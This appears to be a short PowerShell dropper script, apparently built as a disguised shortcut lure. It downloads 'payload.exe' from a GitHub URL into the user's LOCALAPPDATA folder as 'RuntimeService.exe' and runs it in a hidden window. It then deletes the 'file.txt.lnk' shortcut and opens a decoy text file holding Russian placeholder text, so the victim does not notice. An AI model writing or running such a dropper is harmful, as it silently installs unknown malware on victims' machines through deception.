(New-Object System.Net.WebClient).DownloadFile("https://github.com/Rewarny/test/raw/main/payload.exe", "$($env:LOCALAPPDATA)\RuntimeService.exe")
Start-Process -WindowStyle hidden -FilePath "$($env:LOCALAPPDATA)\RuntimeService.exe"
Remove-Item file.txt.lnk
New-Item file.txt
Set-Content file.txt "Любой текст"
Start-Process -FilePath file.txt